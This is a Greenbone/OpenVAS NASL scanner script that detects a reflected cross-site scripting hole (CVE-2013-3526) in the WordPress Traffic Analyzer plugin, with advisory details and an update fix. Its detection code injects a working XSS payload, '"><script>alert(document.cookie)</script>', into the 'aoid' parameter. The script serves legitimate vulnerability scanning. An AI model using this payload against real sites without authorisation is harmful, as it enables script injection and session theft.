# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803372");
  script_version("2023-10-27T05:05:28+0000");
  script_cve_id("CVE-2013-3526");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2013-04-12 17:30:46 +0530 (Fri, 12 Apr 2013)");
  script_name("WordPress Traffic Analyzer Plugin XSS Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/52929");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/58948");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121167");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/wordpress-traffic-analyzer-cross-site-scripting");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
arbitrary HTML and script code, which will be executed in a user's browser
session in the context of an affected site.");
  script_tag(name:"affected", value:"WordPress Traffic Analyzer Plugin version 3.3.2 and prior");
  script_tag(name:"insight", value:"The input passed via 'aoid' parameters to
'/wp-content/plugins/trafficanalyzer/js/ta_loaded.js.php' script is not
properly validated.");
  script_tag(name:"solution", value:"Update to WordPress Traffic Analyzer Plugin version 3.4.0 or
later.");
  script_tag(name:"summary", value:"The WordPress plugin 'Traffic Analyzer' is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/trafficanalyzer");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + '/wp-content/plugins/trafficanalyzer/js/ta_loaded.js.php?aoid='+
            '"><script>alert(document.cookie)</script>';

if(http_vuln_check(port:port, url:url, check_header:TRUE,
                   pattern:"><script>alert\(document\.cookie\)</script>"))
{
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}
